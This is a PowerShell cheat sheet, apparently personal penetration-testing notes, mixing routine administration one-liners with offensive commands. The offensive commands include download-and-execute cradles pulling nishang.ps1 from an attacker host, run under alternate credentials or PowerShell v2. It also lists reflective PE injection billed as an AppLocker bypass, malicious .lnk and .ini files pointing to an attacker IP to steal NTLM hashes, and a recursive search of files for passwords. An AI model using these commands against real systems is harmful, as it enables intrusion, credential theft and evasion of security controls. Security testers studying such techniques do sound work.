# Extract zip file
`Expand-Archive <FILE>.zip`

# Download to disk
## using .Net WebClient:
`(New-Object System.Net.WebClient).DownloadFile('<URL>', <OUTPUTPATH>)`

## using Invoke-WebRequest
`IWR '<URL>' -OutFile <FILENAME>`

# Execute powershell in memory
`(New-Object Net.WebClient).DownloadString('<URL>') | IEX`

# Get files only in a directory
`(ls -File -Recurse -Force -EA SilentlyContinue).fullname`

# Get OS architecture
`$env:processor_architecture`

# Get Process Architecture
`[Environment]::Is64BitProcess`

# Locally listening ports (TCP)
`netstat -ano -p tcp`

# Get ACL
`Get-ACL <PATH_TO_FILE> | Select -Exp AccessToString`

# get file system access
`$ErrorActionPreference = 'silentlycontinue'; ls -recurse -force | ? {$_.fullname -notmatch 'AppData|Application Data|Local Settings'} | ? {(get-acl $_.fullname ).accesstostring -like '*tushikikatomo*'} | select -expand fullname; $ErrorActionPreference = 'continue'`

# Get Process Owners
`Get-WmiObject -class win32_process | ? {$_.name -notlike '*svchost*'} | select name,@{n='owner';e={$_.getowner().user}} | ft -autosize`

# Get .NET Version
## Paths:
`c:\windows\microsoft.net\framework`
`c:\windows\microsoft.net\framework64`
## Command:
`(Get-Item "c:\windows\microsoft.net\framework64\*\clr.dll").VersionInfo.ProductVersion`

# get-bytes of a string
`[System.Text.Encoding]::UTF8.GetBytes('hello')`

# Reflective Execution (Can Bypass Applocker)
`Invoke-reflectivePEInjection -PEBytes ([IO.File]::ReadAllBytes('<PATH_TO_EXE>'))`

# CMD to powershell
`powershell "IEX(New-Object Net.webClient).downloadString('http://<LHOST>:<LPORT>/nishang.ps1')"`

# Start a job with alternative creds
`Start-Job -Credential $Cred -ScriptBlock {IEX(New-Object Net.webClient).downloadString('http://<LHOST>:<LPORT>/nishang.ps1')}`

# Jump to powershell v2
`Start-Process Powershell.exe -ArgumentList "-v 2 -c IEX(New-Object Net.webClient).downloadString('http://10.10.16.7/nishang.ps1')"`

# Get Alternate Data Streams
`$ErrorActionPreference = 'SilentlyContinue'; ls * -Recurse -Force | % {Get-Item $_ -Stream * | ? {$_.Stream -notmatch ':\$DATA|Zone\.Identifier'} |Select FileName, Stream}; $ErrorActionPreference = 'Continue'`

# View listening connections (with optional PID translation to Proc names)
`$PROCS = Get-Process; Get-NetTCPConnection -LocalAddress <LOCAL_IP> | Sort-Object LocalPort | Select-Object @{n='Process';e={$ID = $_.OwningProcess; if($PROCS){($PROCS|?{$ID -eq $_.id}).name}else{$ID}}},LocalAddress,LocalPort,RemoteAddress,RemotePort,State | Format-Table`

# Create Malicious Shortcut (lnk) file to steal hashes
```
$Output_For_Lnk = "$pwd\Microsoft Edge.lnk"
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut($Output_For_Lnk)
$lnk.TargetPath = "\\<ATTACKER_IP>\@source"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browse the web"
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

# Enable PowerShell Remoting
`Enable-PSRemoting -Force`

# Search for strings in files:
`$ErrorActionPreference = 'SilentlyContinue';ls -Recurse -Force | % {sls -Path $_.fullname -Pattern ".*password.*"}; $ErrorActionPreference = 'continue'`

# Create malicious `.ini` file
```
[.ShellClassInfo]
IconResource=\\<ATTACKER_IP>\aaa
```